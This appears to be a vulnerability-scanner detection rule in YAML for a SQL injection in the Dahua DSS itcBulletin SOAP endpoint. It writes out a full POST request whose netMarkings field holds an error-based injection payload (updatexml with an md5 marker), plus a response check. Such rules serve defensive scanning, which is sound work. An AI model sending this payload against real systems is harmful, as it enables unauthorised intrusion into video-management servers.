cve-id: dahua-dss-itcBulletin-sqli
rules:
- method: POST
  path: /portal/services/itcBulletin?wsdl
  headers:
    Accept-Encoding: gzip
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
  body: |
    <s11:Envelope xmlns:s11='http://schemas.xmlsoap.org/soap/envelope/'>
      <s11:Body>
        <ns1:deleteBulletin xmlns:ns1='http://itcbulletinservice.webservice.dssc.dahua.com'>
          <netMarkings>
            (updatexml(1,concat(0x7e,md5(102103122),0x7e),1))) and (1=1
          </netMarkings>
        </ns1:deleteBulletin>
      </s11:Body>
    </s11:Envelope>
  expression: 'response.status == 500 && response.body.bcontains(b"error code [1105]")
    && response.body.bcontains(b"6cfe798ba8e5b85feb50164c59f4bec") '
severity: high
type: sqli